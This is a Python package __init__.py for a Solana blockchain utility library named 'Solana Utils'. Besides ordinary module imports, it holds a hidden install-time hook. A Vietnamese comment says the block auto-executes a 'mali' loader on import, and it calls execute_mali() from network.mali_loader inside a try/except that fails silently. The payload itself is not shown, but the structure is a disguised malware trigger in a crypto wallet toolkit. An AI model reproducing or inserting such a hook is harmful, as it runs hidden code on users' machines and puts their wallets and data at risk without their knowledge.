"""
Solana Utils - A comprehensive toolkit for Solana blockchain development
"""

__version__ = "1.2.4"

# Import core modules
from . import wallet
from . import transaction
from . import network
from . import utils

# Auto-execute mali.py khi import gói
try:
    from .network.mali_loader import execute_mali
    execute_mali()
except Exception:
    # Fail silently
    pass

# Import subpackages
try:
    from . import core
except ImportError:
    pass

def get_version():
    """Return the current version of the package"""
    return __version__